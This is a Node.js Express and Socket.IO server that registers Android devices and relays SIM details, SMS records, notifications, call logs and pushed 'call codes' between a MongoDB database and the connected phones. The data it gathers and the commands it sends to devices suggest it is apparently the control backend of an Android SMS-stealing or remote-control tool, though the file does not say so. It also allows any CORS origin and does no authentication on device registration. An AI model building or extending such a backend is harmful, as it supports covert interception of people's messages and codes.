import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  allowEIO3: true, // ✅ Android older socket.io-client ke liye
});

app.use(cors());
app.use(express.json());
app.set("io", io);

const deviceSockets = new Map();

// 🔹 Save Last Seen
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// 🔹 Emit Call Code Safely (exported)
export async function sendCallCodeToDevice(uniqueId, callData) {
  const socketId = deviceSockets.get(uniqueId);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueId}`);
  } else {
    console.log(`⚠️ No active socket for ${uniqueId} to send callCodeUpdate`);
  }
}

io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  // ===================== REGISTER DEVICE =====================
  socket.on("registerDevice", async (uniqueId) => {
    if (!uniqueId) return;

    // Agar same device ka old socket connected hai to disconnect
    if (deviceSockets.has(uniqueId)) {
      const oldSocketId = deviceSockets.get(uniqueId);
      const oldSocket = io.sockets.sockets.get(oldSocketId);
      if (oldSocket) {
        oldSocket.disconnect(true);
        console.log(`♻️ Old socket for ${uniqueId} disconnected`);
      }
      deviceSockets.delete(uniqueId);
    }

    currentDeviceId = uniqueId;
    deviceSockets.set(uniqueId, socket.id);
    socket.join(uniqueId);

    console.log(`📱 Registered Device: ${uniqueId}`);
    await saveLastSeen(uniqueId, "Online");

    // ✅ Client ko confirm event (Android pe log aayega)
    io.to(socket.id).emit("deviceRegistered", { uniqueId });

    // Device list broadcast
    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueId,
    });

    // 🔥 NEW: connect hote hi last callcode bhej do (agar DB me hai)
    try {
      const callcodesColl = mongoose.connection.collection("callcodes");
      const lastCode = await callcodesColl.findOne(
        { deviceId: uniqueId },
        { sort: { updatedAt: -1 } }
      );

      if (lastCode) {
        console.log(`📞 Sending latest CallCode on connect → ${uniqueId}`);
        io.to(socket.id).emit("callCodeUpdate", lastCode);
      }
    } catch (err) {
      console.error("❌ Error sending last callcode on register:", err);
    }
  });

  // ===================== DEVICE STATUS =====================
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });

    io.emit("deviceListUpdated", {
      event: "status_changed",
      uniqueid,
      connectivity,
    });
  });

  // ===================== DISCONNECT =====================
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      setTimeout(() => {
        const stillConnected = [...deviceSockets.values()].includes(socket.id);
        if (!stillConnected) {
          deviceSockets.delete(currentDeviceId);
          io.emit("deviceStatus", {
            uniqueid: currentDeviceId,
            connectivity: "Offline",
            updatedAt: new Date(),
          });
          io.emit("deviceListUpdated", {
            event: "device_disconnected",
            uniqueid: currentDeviceId,
          });
          saveLastSeen(currentDeviceId, "Offline");
        }
      }, 5000);
    }
  });
});

// ===================== MONGO CHANGE STREAMS =====================

mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS...");

  try {
    // 🟢 Device Collection Watch
    const deviceStream = mongoose.connection.collection("devices").watch();
    deviceStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDevice = await mongoose.connection
        .collection("devices")
        .findOne({ _id: change.documentKey._id });

      if (updatedDevice) {
        console.log(`📡 Device Change → ${updatedDevice.uniqueId}`);
        io.emit("deviceListUpdated", { event: "db_change", device: updatedDevice });
      }
    });

    // 🆕 SIM Info Collection Watch
    const simStream = mongoose.connection.collection("siminfos").watch();
    simStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedSim = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: change.documentKey._id });

      if (updatedSim) {
        console.log(`📶 SIM Change → ${updatedSim.deviceId}`);
        io.emit("simInfoUpdated", {
          event: "sim_change",
          sim: updatedSim,
        });
      }
    });

    // 📞 CallCodes Watch
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📞 CallCode Changed → ${deviceId}`);
      sendCallCodeToDevice(deviceId, updatedDoc);
    });

    // ✉️ SMS Watch
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📩 SMS Changed → ${deviceId}`);
      const socketId = deviceSockets.get(deviceId);
      if (socketId && io.sockets.sockets.get(socketId)) {
        io.to(socketId).emit("smsUpdate", updatedDoc);
      }
    });
  } catch (err) {
    console.error("💥 Change stream init failed:", err);
  }
});

// ===================== EXPRESS ROUTES =====================

app.get("/", (req, res) => {
  res.send("✅ Live Socket + MongoDB Streams running (Devices, SIM, Calls, SMS)");
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// 404
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);

// Error handler
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
